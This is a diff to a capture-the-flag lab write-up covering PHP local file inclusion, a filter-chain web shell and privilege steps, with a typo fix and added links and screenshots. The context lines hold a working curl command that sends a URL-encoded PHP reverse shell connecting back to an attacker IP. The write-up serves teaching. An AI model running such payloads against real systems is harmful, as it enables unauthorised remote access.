@@ -26,7 +26,7 @@ To get the first flag, I first needed to perform an enum using gobuster:
 
 `gobuster dir -u "http://10.10.242.241" -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php, .txt`
 
-Then I discovered that there is a flag.php file. I tried to access it but it didn't print out any results. So we need a way to get its content. For that I use a payload form that article https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md.
+Then I discovered that there is a flag.php file. I tried to access it but it didn't print out any results. So we need a way to get its content. For that I use a payload from that article https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md.
 
 Put it on practice: 
 
@@ -38,7 +38,10 @@ Got a base64 response so I used cyberchef to decode it
 
 ## Web shell
 
-Now we to use another wrapper to execute shell commands. After some search, I found that I could use the filter wrapper and this python script to make the exploit https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
+Now we to use another wrapper to execute shell commands. After some search, I found that I could use the filter wrapper (thx to this site: https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams) and this python script to make the exploit https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
+
+![image](https://github.com/Roqlane/writeups/assets/78229498/9363c59d-214b-4d65-8fda-b02944433f4e)
+
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/029728ae-1bef-4cd0-8828-0363ed980874)
 
@@ -50,6 +53,10 @@ Execute `ls%20..%2F` on the cmd param and you found out that there is the second
 
 ## Reverse shell
 
+![image](https://github.com/Roqlane/writeups/assets/78229498/a5fe8bbc-12a5-4de9-9cca-f82e54845521)
+
+I put the result in the FILTERS variable
+
 `curl --user-agent "PENTEST" "http://10.10.17.47/?view=php://filter/$FILTERS/resource=cat&cmd=php%20-r%20'%24sock%3Dfsockopen(%2210.9.164.243%22%2C6969)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B'" --output result`
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/2fe4aa6a-e835-4bd8-aedd-88a0c4fc328e)
@@ -59,6 +66,10 @@ Execute `ls%20..%2F` on the cmd param and you found out that there is the second
 Well...
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/a4c4198b-a6e0-4ab8-921a-b20e20f2ccca)
+
+Or
+
+TODO env root
 
 ![image](https://github.com/Roqlane/writeups/assets/78229498/b8083628-f747-46d3-841c-574ed560bbd6)
 
